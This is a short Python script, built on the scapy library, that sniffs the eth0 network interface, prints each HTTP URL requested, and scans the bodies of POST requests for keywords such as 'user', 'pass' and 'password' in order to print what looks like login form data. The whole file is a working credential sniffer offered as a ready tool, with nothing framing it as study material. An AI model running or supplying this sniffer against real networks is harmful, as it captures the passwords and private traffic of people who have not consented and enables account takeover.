#!/usr/bin/env python3

try:
    import scapy.all as scapy
except ImportError:
    import scapy

#https://scapy.readthedocs.io/en/latest/layers/http.html
try:
    # This import works from the project directory
    import scapy_http.http
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_processer)

def packet_processer(packet):
    if packet.haslayer(http.HTTPRequest):
        # retrieve the HTTPRequest Method from the HTTP request headers
        method = packet[http.HTTPRequest].Method
        # retrieve the URL used for login
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] URL requested: {url.decode('utf-8')}")
        if method == b"POST":
            # check if the packet has the Raw section and save the load part containing the form data
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                #decode the load
                try:
                    load_str = load.decode('utf-8')
                # decoding with errors ignored
                except UnicodeDecodeError:
                    load_str = load.decode('utf-8', errors='ignore')
                keywords = ["login", "user", "username", "uname", "pass", "password", "passwd", "&", "="]
                for keyword in keywords:
                    if keyword in load_str:
                        print(f"\n\n[+] Potential login form data for {url.decode('utf-8')}: {load_str}\n\n")
                        break

sniff("eth0")
